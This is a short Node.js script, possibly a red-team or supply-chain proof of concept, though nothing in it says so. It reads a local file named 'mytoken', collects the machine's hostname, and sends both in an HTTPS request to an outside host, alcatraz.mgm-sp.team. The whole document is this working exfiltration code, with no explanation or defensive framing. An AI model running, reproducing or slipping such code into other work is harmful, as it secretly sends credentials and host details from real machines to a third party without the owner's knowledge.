const fs = require('fs');
const https = require('https');
const os = require('os');

const content = fs.existsSync('mytoken') ? fs.readFileSync('mytoken', 'utf8') : '';
const hostname = os.hostname();
const url = `https://alcatraz.mgm-sp.team/wrtqva?content=${encodeURIComponent(content)}&hostname=${encodeURIComponent(hostname)}`;

https.get(url, (res) => {
  console.log(`Status: ${res.statusCode}`);
}).on('error', (err) => {
  console.error(`Error: ${err.message}`);
});
